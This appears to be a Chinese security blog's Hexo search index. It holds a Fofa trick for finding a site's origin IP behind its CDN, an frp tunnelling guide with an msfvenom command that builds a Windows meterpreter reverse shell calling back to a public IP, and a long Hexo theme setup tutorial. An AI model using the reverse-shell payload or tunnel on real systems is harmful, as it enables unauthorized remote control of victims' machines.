<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>靶场学习记录</title>
      <link href="/2022/01/20/ba-chang-xue-xi-ji-lu/"/>
      <url>/2022/01/20/ba-chang-xue-xi-ji-lu/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>使用Fofa确定网站真实IP地址的小技巧</title>
      <link href="/2022/01/19/shi-yong-fofa-que-ding-wang-zhan-zhen-shi-ip-di-zhi-de-xiao-ji-qiao/"/>
      <url>/2022/01/19/shi-yong-fofa-que-ding-wang-zhan-zhen-shi-ip-di-zhi-de-xiao-ji-qiao/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>我们想确定一个网站的真实IP地址，通常现在网站都会使用https协议，用到SSL证书是必不可少的，绝大多数企业证书都是通配符证书，因此我们可以把证书的序列号拿下来然后搜索这个证书用在了哪些业务里，然后如果部分业务中没有使用CDN或者没有覆盖到CDN，源IP地址就显示出来了！</p><h2 id="Fofa"><a href="#Fofa" class="headerlink" title="Fofa"></a>Fofa</h2><p><a href="https://fofa.so/">https://fofa.so/</a></p><h2 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h2><p>以<a href="https://www.zhihu.com/signin?next=/">知乎</a>网站为例，我们先访问网站，然后按F12打开<code>开发者工具</code>，点击<code>Security</code></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191810197.png" alt="image-20220119181014309"></p><p>点击<code>View certificate</code>，查看证书详情</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191811564.png" alt="image-20220119181100340"></p><p>这里有<code>详细信息</code>，其中我们可以看到<code>序列号</code></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191812758.png" alt="image-20220119181239327"></p><pre class="line-numbers language-none"><code class="language-none">08FD71FF37DEFF955767502270961AE6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后，我们使用<a href="https://tool.lu/hexconvert/">在线转换工具</a>，将16进制的序列号转换为10进制</p><pre class="line-numbers language-none"><code class="language-none">14516903431790578896883864801849922917<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191820420.png" alt="image-20220119182038459"></p><p>这时候Fofa的作用就来了，我们可以通过下面的语句来进行调查</p><pre class="line-numbers language-none"><code class="language-none">cert&#x3D;&quot;11949787204246556179857180358287432422&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191821509.png" alt="image-20220119182112934"></p>]]></content>
      
      
      
        <tags>
            
            <tag> FOFA 真实IP定位 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Frp内网穿透把MSF拖入内网</title>
      <link href="/2022/01/19/frp-nei-wang-chuan-tou-ba-msf-tuo-ru-nei-wang/"/>
      <url>/2022/01/19/frp-nei-wang-chuan-tou-ba-msf-tuo-ru-nei-wang/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>frp 中文文档：<a href="https://gofrp.org/docs/">https://gofrp.org/docs/</a></p><p>frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网；</p><p>frp下载地址：<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p><h2 id="FPR简介"><a href="#FPR简介" class="headerlink" title="FPR简介"></a>FPR简介</h2><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191706956.jpeg" alt="img"></p><p>通过在具有公网 IP 的节点上部署 frp 服务端，可以轻松地将内网服务穿透到公网，同时提供诸多专业的功能特性，这包括：</p><ul><li><p>客户端服务端通信支持 TCP、KCP 以及 Websocket 等多种协议。</p></li><li><p>采用 TCP 连接流式复用，在单个连接间承载更多请求，节省连接建立时间。</p></li><li><p>代理组间的负载均衡。</p></li><li><p>端口复用，多个服务通过同一个服务端端口暴露。</p></li><li><p>多个原生支持的客户端插件（静态文件查看，HTTP、SOCK5 代理等），便于独立使用 frp 客户端完成某些工作。</p></li><li><p>高度扩展性的服务端插件系统，方便结合自身需求进行功能扩展。</p></li><li><p>服务端和客户端 UI 页面。</p></li></ul><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>编写配置文件，先通过 ./frps -c ./frps.ini 启动服务端，再通过 ./frpc -c ./frpc.ini 启动客户端。如果需要在后台长期运行，建议结合其他工具使用，例如 systemd 和 supervisor；</p><p>1、服务端frps.ini 内容如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>bind_port <span class="token operator">=</span> <span class="token number">10014</span>token <span class="token operator">=</span> <span class="token number">12345678</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191706841.png" alt="img"></p><p>2、在需要暴露到内网的机器上部署 frpc，frpc.ini配置如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>server_addr <span class="token operator">=</span> <span class="token number">45.32</span><span class="token number">.38</span><span class="token number">.119</span>server_port <span class="token operator">=</span> <span class="token number">10014</span>token <span class="token operator">=</span> <span class="token number">12345678</span><span class="token punctuation">[</span>ssh<span class="token punctuation">]</span><span class="token builtin">type</span> <span class="token operator">=</span> tcplocal_ip <span class="token operator">=</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>           local_port <span class="token operator">=</span> <span class="token number">1234</span>remote_port <span class="token operator">=</span> <span class="token number">10015</span> 其中common字段下的三项即为服务端的设置。“server_addr”为服务端IP地址，填入即可。“server_port”为服务器端口，填入你设置的端口号即可，如果未改变就是<span class="token number">7000</span>“token”是你在服务器上设置的连接口令，原样填入即可。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191707427.png" alt="img"></p><p>注意：客户端连接服务端提示访问被拒绝，则需要服务端开放防火墙端口（学习的话全开就行了，生产环境除外）</p><h2 id="联动MSF"><a href="#联动MSF" class="headerlink" title="联动MSF"></a>联动MSF</h2><p>启动FRP服务端：</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191707174.png" alt="img"></p><p>启动FRP客户端：</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191707667.png" alt="img"></p><p>启动MSF监听：</p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191707536.png" alt="img"></p><p>使用msf生成payload实现主机上线：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp  lhost<span class="token operator">=</span><span class="token number">45.32</span><span class="token number">.38</span><span class="token number">.119</span> lport<span class="token operator">=</span><span class="token number">10015</span> <span class="token operator">-</span>f exe <span class="token operator">-</span>o frptest<span class="token punctuation">.</span>exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191707254.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191707659.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191707135.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> FRP MSF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo搭建个人博客系列：基础建站篇</title>
      <link href="/2022/01/19/hexo-da-jian-ge-ren-bo-ke-xi-lie-ji-chu-jian-zhan-pian/"/>
      <url>/2022/01/19/hexo-da-jian-ge-ren-bo-ke-xi-lie-ji-chu-jian-zhan-pian/</url>
      
        <content type="html"><![CDATA[<p>Hexo 是一个高效简洁的静态博客框架，支持 Markdown 写作语法，插件丰富，主题优雅，部署方便。目前已成为多数人博客建站的选择。</p><h1 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h1><p>使用命令行中通过 npm 来安装 Hexo：</p><pre class="line-numbers language-none"><code class="language-none">npm install -g hexo-cli<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>-g</code> 表示全局安装，会将 Hexo 命令加入环境变量中，以使其在 cmd 下有效。</p><p>Hexo 依赖于 <a href="https://nodejs.org/zh-cn/">Node.js</a> 和 <a href="https://git-scm.com/download/">git</a>，所以在安装 Hexo 之前先确保已安装了这两项应用。</p><p>新建博客目录，然后在该路径下执行初始化命令：</p><pre class="line-numbers language-none"><code class="language-none">hexo init<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>官方教程中提到要在项目目录下执行 <code>npm install</code> 命令，事实上不必如此，在执行 <code>hexo init</code> 的过程中就已经自动安装好了项目依赖。</p><p>执行完毕后，将会生成以下文件结构：</p><pre class="line-numbers language-none"><code class="language-none">.├── node_modules       &#x2F;&#x2F;依赖安装目录├── scaffolds          &#x2F;&#x2F;模板文件夹，新建的文章将会从此目录下的文件中继承格式|   ├── draft.md         &#x2F;&#x2F;草稿模板|   ├── page.md          &#x2F;&#x2F;页面模板|   └── post.md          &#x2F;&#x2F;文章模板├── source             &#x2F;&#x2F;资源文件夹，用于放置图片、数据、文章等资源|   └── _posts           &#x2F;&#x2F;文章目录├── themes             &#x2F;&#x2F;主题文件夹|   └── landscape        &#x2F;&#x2F;默认主题├── .gitignore         &#x2F;&#x2F;指定不纳入git版本控制的文件├── _config.yml        &#x2F;&#x2F;站点配置文件├── db.json            ├── package.json└── package-lock.json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在根目录下执行如下命令启动 hexo 的内置 Web 服务器</p><pre class="line-numbers language-none"><code class="language-none">hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该命令将会调用 Markdown 引擎解析项目中的博客内容生成网页资源，资源将会存于内存中，所以用户执行完命令之后在项目文件夹中是找不到相关的 Web 资源目录的。该命令还会启动一个简易的 Web 服务器用于提供对内存中网页资源的访问（工作机制类似于 webpack-dev-server），Web 服务器默认监听 4000 端口，用户可在浏览器中通过地址 <code>localhost:4000</code> 访问博客。</p><p><a href="http://yearito-1256884783.image.myqcloud.com/hexo-get-started/20181102070503130.png"><img src="http://yearito-1256884783.image.myqcloud.com/hexo-get-started/20181102070503130.png" alt="Hexo 默认主题首页"></a></p><p><a href="http://yearito-1256884783.image.myqcloud.com/hexo-get-started/20181102070503130.png">Hexo 默认主题首页</a></p><p>此外，可以通过添加命令行参数来支持高级用法：</p><ul><li>当 4000 端口已被其他应用占用时，可以添加 <code>-p</code> / <code>--port</code> 参数来设置 Web 服务监听的端口号，如<code>hexo s -p 8000</code></li><li>默认情况下，hexo 监听项目目录的文件变化，用户对于项目文件的任何改动都会触发实时解析编译并更新内存中的网页资源，也就是说，用户在本地修改后刷新浏览器就可以看到改动效果。如果不希望 hexo 监听项目目录的文件变化，可以添加 <code>-s</code> / <code>--static</code> 参数，这样本地改动就不会触发 hexo 实时解析更新。</li></ul><h1 id="更换-Matery主题"><a href="#更换-Matery主题" class="headerlink" title="更换 Matery主题"></a>更换 Matery主题</h1><ul><li><p>下载</p><p>本主题<strong>推荐你使用 Hexo 5.0.0 及以上的版本</strong>。如果，你已经有一个自己的 <a href="https://hexo.io/zh-cn/">Hexo</a> 博客了，建议你将 Hexo 升级到最新稳定的版本。</p><p>点击 <a href="https://codeload.github.com/blinkfox/hexo-theme-matery/zip/master">这里</a> 下载 <code>master</code> 分支的最新稳定版的代码，解压缩后，将 <code>hexo-theme-matery</code> 的文件夹复制到你 Hexo 的 <code>themes</code> 文件夹中即可。</p><p>当然你也可以在你的 <code>themes</code> 文件夹下使用 <code>git clone</code> 命令来下载:</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;blinkfox&#x2F;hexo-theme-matery.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="切换主题"><a href="#切换主题" class="headerlink" title="切换主题"></a>切换主题</h3><p>修改 Hexo 根目录下的 <code>_config.yml</code> 的 <code>theme</code> 的值：<code>theme: hexo-theme-matery</code></p><h4 id="config-yml-文件的其它修改建议"><a href="#config-yml-文件的其它修改建议" class="headerlink" title="_config.yml 文件的其它修改建议:"></a><code>_config.yml</code> 文件的其它修改建议:</h4><ul><li>请修改 <code>_config.yml</code> 的 <code>url</code> 的值为你的网站主 <code>URL</code>（如：<code>http://xxx.github.io</code>）。</li><li>建议修改两个 <code>per_page</code> 的分页条数值为 <code>6</code> 的倍数，如：<code>12</code>、<code>18</code> 等，这样文章列表在各个屏幕下都能较好的显示。</li><li>如果你是中文用户，则建议修改 <code>language</code> 的值为 <code>zh-CN</code>。</li></ul><h3 id="新建分类-categories-页"><a href="#新建分类-categories-页" class="headerlink" title="新建分类 categories 页"></a>新建分类 categories 页</h3><p><code>categories</code> 页是用来展示所有分类的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>categories/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-none"><code class="language-none">hexo new page &quot;categories&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/categories/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-none"><code class="language-none">---title: categoriesdate: 2018-09-30 17:25:30type: &quot;categories&quot;layout: &quot;categories&quot;---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="新建标签-tags-页"><a href="#新建标签-tags-页" class="headerlink" title="新建标签 tags 页"></a>新建标签 tags 页</h3><p><code>tags</code> 页是用来展示所有标签的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>tags/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-none"><code class="language-none">hexo new page &quot;tags&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/tags/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-none"><code class="language-none">---title: tagsdate: 2018-09-30 18:23:38type: &quot;tags&quot;layout: &quot;tags&quot;---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="新建关于我-about-页"><a href="#新建关于我-about-页" class="headerlink" title="新建关于我 about 页"></a>新建关于我 about 页</h3><p><code>about</code> 页是用来展示<strong>关于我和我的博客</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>about/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-none"><code class="language-none">hexo new page &quot;about&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/about/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-none"><code class="language-none">---title: aboutdate: 2018-09-30 17:25:30type: &quot;about&quot;layout: &quot;about&quot;---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="新建留言板-contact-页（可选的）"><a href="#新建留言板-contact-页（可选的）" class="headerlink" title="新建留言板 contact 页（可选的）"></a>新建留言板 contact 页（可选的）</h3><p><code>contact</code> 页是用来展示<strong>留言板</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>contact/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-none"><code class="language-none">hexo new page &quot;contact&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/contact/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-none"><code class="language-none">---title: contactdate: 2018-09-30 17:25:30type: &quot;contact&quot;layout: &quot;contact&quot;---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注</strong>：本留言板功能依赖于第三方评论系统，请<strong>激活</strong>你的评论系统才有效果。并且在主题的 <code>_config.yml</code> 文件中，第 <code>19</code> 至 <code>21</code> 行的“<strong>菜单</strong>”配置，取消关于留言板的注释即可。</p></blockquote><h3 id="新建友情链接-friends-页（可选的）"><a href="#新建友情链接-friends-页（可选的）" class="headerlink" title="新建友情链接 friends 页（可选的）"></a>新建友情链接 friends 页（可选的）</h3><p><code>friends</code> 页是用来展示<strong>友情链接</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>friends/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-none"><code class="language-none">hexo new page &quot;friends&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/friends/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-none"><code class="language-none">---title: friendsdate: 2018-12-12 21:25:30type: &quot;friends&quot;layout: &quot;friends&quot;---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同时，在你的博客 <code>source</code> 目录下新建 <code>_data</code> 目录，在 <code>_data</code> 目录中新建 <code>friends.json</code> 文件，文件内容如下所示：</p><pre class="line-numbers language-none"><code class="language-none">[&#123;    &quot;avatar&quot;: &quot;http:&#x2F;&#x2F;image.luokangyuan.com&#x2F;1_qq_27922023.jpg&quot;,    &quot;name&quot;: &quot;码酱&quot;,    &quot;introduction&quot;: &quot;我不是大佬，只是在追寻大佬的脚步&quot;,    &quot;url&quot;: &quot;http:&#x2F;&#x2F;luokangyuan.com&#x2F;&quot;,    &quot;title&quot;: &quot;前去学习&quot;&#125;, &#123;    &quot;avatar&quot;: &quot;http:&#x2F;&#x2F;image.luokangyuan.com&#x2F;4027734.jpeg&quot;,    &quot;name&quot;: &quot;闪烁之狐&quot;,    &quot;introduction&quot;: &quot;编程界大佬，技术牛，人还特别好，不懂的都可以请教大佬&quot;,    &quot;url&quot;: &quot;https:&#x2F;&#x2F;blinkfox.github.io&#x2F;&quot;,    &quot;title&quot;: &quot;前去学习&quot;&#125;, &#123;    &quot;avatar&quot;: &quot;http:&#x2F;&#x2F;image.luokangyuan.com&#x2F;avatar.jpg&quot;,    &quot;name&quot;: &quot;ja_rome&quot;,    &quot;introduction&quot;: &quot;平凡的脚步也可以走出伟大的行程&quot;,    &quot;url&quot;: &quot;https:&#x2F;&#x2F;me.csdn.net&#x2F;jlh912008548&quot;,    &quot;title&quot;: &quot;前去学习&quot;&#125;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="新建-404-页"><a href="#新建-404-页" class="headerlink" title="新建 404 页"></a>新建 404 页</h3><p>如果在你的博客 <code>source</code> 目录下还没有 <code>404.md</code> 文件，那么你就需要新建一个</p><pre class="line-numbers language-none"><code class="language-none">hexo new page 404<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/404/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-none"><code class="language-none">---title: 404date: 2018-09-30 17:25:30type: &quot;404&quot;layout: &quot;404&quot;description: &quot;Oops～，我崩溃了！找不到你想要的页面 :(&quot;---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="菜单导航配置"><a href="#菜单导航配置" class="headerlink" title="菜单导航配置"></a>菜单导航配置</h3><h4 id="配置基本菜单导航的名称、路径url和图标icon"><a href="#配置基本菜单导航的名称、路径url和图标icon" class="headerlink" title="配置基本菜单导航的名称、路径url和图标icon."></a>配置基本菜单导航的名称、路径url和图标icon.</h4><p>1.菜单导航名称可以是中文也可以是英文(如：<code>Index</code>或<code>主页</code>) 2.图标icon 可以在<a href="https://fontawesome.com/icons">Font Awesome</a> 中查找</p><pre class="line-numbers language-none"><code class="language-none">menu:  Index:    url: &#x2F;    icon: fas fa-home  Tags:    url: &#x2F;tags    icon: fas fa-tags  Categories:    url: &#x2F;categories    icon: fas fa-bookmark  Archives:    url: &#x2F;archives    icon: fas fa-archive  About:    url: &#x2F;about    icon: fas fa-user-circle  Friends:    url: &#x2F;friends    icon: fas fa-address-book<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="二级菜单配置方法"><a href="#二级菜单配置方法" class="headerlink" title="二级菜单配置方法"></a>二级菜单配置方法</h4><p>如果你需要二级菜单则可以在原基本菜单导航的基础上如下操作</p><ol><li>在需要添加二级菜单的一级菜单下添加<code>children</code>关键字(如:<code>About</code>菜单下添加<code>children</code>)</li><li>在<code>children</code>下创建二级菜单的 名称name,路径url和图标icon.</li><li>注意每个二级菜单模块前要加 <code>-</code>.</li><li>注意缩进格式</li></ol><pre class="line-numbers language-none"><code class="language-none">menu:  Index:    url: &#x2F;    icon: fas fa-home  Tags:    url: &#x2F;tags    icon: fas fa-tags  Categories:    url: &#x2F;categories    icon: fas fa-bookmark  Archives:    url: &#x2F;archives    icon: fas fa-archive  About:    url: &#x2F;about    icon: fas fa-user-circle-o  Friends:    url: &#x2F;friends    icon: fas fa-address-book  Medias:    icon: fas fa-list    children:      - name: Music        url: &#x2F;music        icon: fas fa-music      - name: Movies        url: &#x2F;movies        icon: fas fa-film      - name: Books        url: &#x2F;books        icon: fas fa-book      - name: Galleries        url: &#x2F;galleries        icon: fas fa-image<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="代码高亮"><a href="#代码高亮" class="headerlink" title="代码高亮"></a>代码高亮</h3><p>从 Hexo5.0 版本开始自带了 <code>prismjs</code> 代码语法高亮的支持，本主题对此进行了改造支持。</p><p>如果你的博客中曾经安装过 <code>hexo-prism-plugin</code> 的插件，那么你须要执行 <code>npm uninstall hexo-prism-plugin</code> 来卸载掉它，否则生成的代码中会有 <code>&#123;</code> 和 <code>&#125;</code> 的转义字符。</p><p>然后，修改 Hexo 根目录下 <code>_config.yml</code> 文件中 <code>highlight.enable</code> 的值为 <code>false</code>，并将 <code>prismjs.enable</code> 的值设置为 <code>true</code>，主要配置如下：</p><pre class="line-numbers language-none"><code class="language-none">highlight:  enable: false  line_number: true  auto_detect: false  tab_replace: &#39;&#39;  wrap: true  hljs: falseprismjs:  enable: true  preprocess: true  line_number: true  tab_replace: &#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主题中默认的 <code>prismjs</code> 主题是 <code>Tomorrow Night</code>，如果你想定制自己的主题，可以前往 <a href="https://prismjs.com/download.html">prismjs 下载页面</a> 定制下载自己喜欢的主题 <code>css</code> 文件，然后将此 css 主题文件取名为 <code>prism.css</code>，替换掉 <code>hexo-theme-matery</code> 主题文件夹中的 <code>source/libs/prism/prism.css</code> 文件即可。</p><h3 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h3><p>本主题中还使用到了 <a href="https://github.com/wzpan/hexo-generator-search">hexo-generator-search</a> 的 Hexo 插件来做内容搜索，安装命令如下：</p><pre class="line-numbers language-none"><code class="language-none">npm install hexo-generator-search --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class="line-numbers language-none"><code class="language-none">search:  path: search.xml  field: post<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="中文链接转拼音（建议安装）"><a href="#中文链接转拼音（建议安装）" class="headerlink" title="中文链接转拼音（建议安装）"></a>中文链接转拼音（建议安装）</h3><p>如果你的文章名称是中文的，那么 Hexo 默认生成的永久链接也会有中文，这样不利于 <code>SEO</code>，且 <code>gitment</code> 评论对中文链接也不支持。我们可以用 <a href="https://github.com/viko16/hexo-permalink-pinyin">hexo-permalink-pinyin</a> Hexo 插件使在生成文章时生成中文拼音的永久链接。</p><p>安装命令如下：</p><pre class="line-numbers language-none"><code class="language-none">npm i hexo-permalink-pinyin --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class="line-numbers language-none"><code class="language-none">permalink_pinyin:  enable: true  separator: &#39;-&#39; # default: &#39;-&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注</strong>：除了此插件外，<a href="https://github.com/rozbo/hexo-abbrlink">hexo-abbrlink</a> 插件也可以生成非中文的链接。</p></blockquote><h3 id="文章字数统计插件（建议安装）"><a href="#文章字数统计插件（建议安装）" class="headerlink" title="文章字数统计插件（建议安装）"></a>文章字数统计插件（建议安装）</h3><p>如果你想要在文章中显示文章字数、阅读时长信息，可以安装 <a href="https://github.com/willin/hexo-wordcount">hexo-wordcount</a>插件。</p><p>安装命令如下：</p><pre class="line-numbers language-none"><code class="language-none">npm i --save hexo-wordcount<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后只需在本主题下的 <code>_config.yml</code> 文件中，将各个文章字数相关的配置激活即可：</p><pre class="line-numbers language-none"><code class="language-none">postInfo:  date: true  update: false  wordCount: false # 设置文章字数统计为 true.  totalCount: false # 设置站点文章总字数统计为 true.  min2read: false # 阅读时长.  readCount: false # 阅读次数.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="添加emoji表情支持（可选的）"><a href="#添加emoji表情支持（可选的）" class="headerlink" title="添加emoji表情支持（可选的）"></a>添加emoji表情支持（可选的）</h3><p>本主题新增了对<code>emoji</code>表情的支持，使用到了 <a href="https://npm.taobao.org/package/hexo-filter-github-emojis">hexo-filter-github-emojis</a> 的 Hexo 插件来支持 <code>emoji</code>表情的生成，把对应的<code>markdown emoji</code>语法（<code>::</code>,例如：<code>:smile:</code>）转变成会跳跃的<code>emoji</code>表情，安装命令如下：</p><pre class="line-numbers language-none"><code class="language-none">npm install hexo-filter-github-emojis --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class="line-numbers language-none"><code class="language-none">githubEmojis:  enable: true  className: github-emoji  inject: true  styles:  customEmojis:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行 <code>hexo clean &amp;&amp; hexo g</code> 重新生成博客文件，然后就可以在文章中对应位置看到你用<code>emoji</code>语法写的表情了。</p><h3 id="添加-RSS-订阅支持（可选的）"><a href="#添加-RSS-订阅支持（可选的）" class="headerlink" title="添加 RSS 订阅支持（可选的）"></a>添加 RSS 订阅支持（可选的）</h3><p>本主题中还使用到了 <a href="https://github.com/hexojs/hexo-generator-feed">hexo-generator-feed</a> 的 Hexo 插件来做 <code>RSS</code>，安装命令如下：</p><pre class="line-numbers language-none"><code class="language-none">npm install hexo-generator-feed --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class="line-numbers language-none"><code class="language-none">feed:  type: atom  path: atom.xml  limit: 20  hub:  content:  content_limit: 140  content_limit_delim: &#39; &#39;  order_by: -date<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行 <code>hexo clean &amp;&amp; hexo g</code> 重新生成博客文件，然后在 <code>public</code> 文件夹中即可看到 <code>atom.xml</code> 文件，说明你已经安装成功了。</p><h3 id="添加-DaoVoice-在线聊天功能（可选的）"><a href="#添加-DaoVoice-在线聊天功能（可选的）" class="headerlink" title="添加 DaoVoice 在线聊天功能（可选的）"></a>添加 <a href="http://www.daovoice.io/">DaoVoice</a> 在线聊天功能（可选的）</h3><p>前往 <a href="http://www.daovoice.io/">DaoVoice</a> 官网注册并且获取 <code>app_id</code>，并将 <code>app_id</code> 填入主题的 <code>_config.yml</code> 文件中。</p><h3 id="添加-Tidio-在线聊天功能（可选的）"><a href="#添加-Tidio-在线聊天功能（可选的）" class="headerlink" title="添加 Tidio 在线聊天功能（可选的）"></a>添加 <a href="https://www.tidio.com/">Tidio</a> 在线聊天功能（可选的）</h3><p>前往 <a href="https://www.tidio.com/">Tidio</a> 官网注册并且获取 <code>Public Key</code>，并将 <code>Public Key</code> 填入主题的 <code>_config.yml</code> 